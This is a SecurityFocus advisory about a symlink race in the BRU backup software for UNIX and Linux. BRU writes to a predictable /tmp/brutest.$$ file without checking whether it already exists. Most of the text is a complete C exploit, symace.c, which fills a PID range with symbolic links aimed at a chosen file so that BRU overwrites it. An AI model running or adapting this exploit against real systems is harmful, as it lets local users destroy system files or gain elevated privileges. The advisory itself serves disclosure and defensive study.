source: http://www.securityfocus.com/bid/3970/info

BRU is a commercially available backup software infrastructure available for both UNIX and Linux Operating Systems. It is distributed and maintained by the Tolis Group.

When BRU executes, it creates temporary files insecurely. BRU uses easily predicted temporary filename /tmp/brutest.$$ where $$ is the process id of the executing shell. The program also does not check for an already existing file of the same name.

This makes it possible for a local user to launch a symbolic link attack, and could lead to the overwriting of system files, or potentially elevated privileges.

/* symace.c -0.0.1 - A generic filesystem symlink/race thinger */

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>

/* Please note that there is no error checking... */
/* By Andrew Griffiths (nullptr@tasmail.com)    */

int main(int argc, char **argv)
{
        char *overwrite;
        char *base;
        int start_pid, end_pid;
        int i, size;

        overwrite = strdup(argv[1]);
        size = strlen(argv[2]) + 8 + 1;
        base = malloc(size);
        start_pid=atoi(argv[3]);
        end_pid=atoi(argv[4]);

        for(i=start_pid;i<end_pid;i++) {
                memset(base, 0, size-1);
                snprintf(base, size-1, "%s%d", argv[2], i);
                if(symlink(overwrite, base)==-1) {
                        printf("Unable to create %s bailing\n", base);
                        exit(EXIT_FAILURE);
                }
        }
        printf("done\n");
}